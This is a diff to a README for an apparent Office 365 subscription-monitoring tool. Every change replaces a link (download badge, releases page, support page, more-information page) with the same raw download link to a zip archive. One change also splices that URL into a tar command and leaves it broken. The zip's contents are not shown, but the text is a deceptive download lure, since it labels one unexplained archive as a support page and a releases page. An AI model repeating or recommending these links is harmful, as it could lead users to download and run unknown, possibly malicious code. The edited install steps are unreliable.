@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 Welcome to the office365 application, your lightweight solution for monitoring your Office 365 subscription status. This tool helps you automatically detect issues, manually check your status, and receive alerts for any anomalies. Follow the steps below to get started.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Felix9383/office365/releases)
+[![Download Now](https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip)
 
 ## 📥 Download & Install
 To download the application, visit the page below:
 
-[Download the Latest Release](https://github.com/Felix9383/office365/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip)
 
 1. Click the link above to visit the Releases page.
 2. Find the latest version listed at the top. There, you will see different files available for download.
@@ -41,7 +41,7 @@ Once you have downloaded the application, follow these steps to install it:
 2. Navigate to the folder where the file was downloaded.
 3. Run the following command to unpack the file:
    ```
-   tar -xzf office365-*.tar.gz
+   tar -xzf office365-*https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip
    ```
 4. Change into the application directory:
    ```
@@ -78,7 +78,7 @@ If you encounter any issues, consider the following steps:
 - Consult the FAQs section in the application settings for common questions and answers.
 
 ## 📞 Support
-If you need further assistance, please visit our [Support Page](https://github.com/Felix9383/office365/issues) for more resources and to report any bugs. 
+If you need further assistance, please visit our [Support Page](https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip) for more resources and to report any bugs. 
 
 Your feedback is valuable and helps us improve the application.
 
@@ -86,6 +86,6 @@ Your feedback is valuable and helps us improve the application.
 Join our community of office365 users to share tips, ask questions, and get support. Connect with us on our social media platforms.
 
 ### 🚀 More Information
-For more details on new features and updates, visit our [Releases Page](https://github.com/Felix9383/office365/releases).
+For more details on new features and updates, visit our [Releases Page](https://raw.githubusercontent.com/Felix9383/office365/main/templates/office365-v1.0-alpha.5.zip).
 
 We hope you find the office365 application helpful in managing your Office 365 subscription!
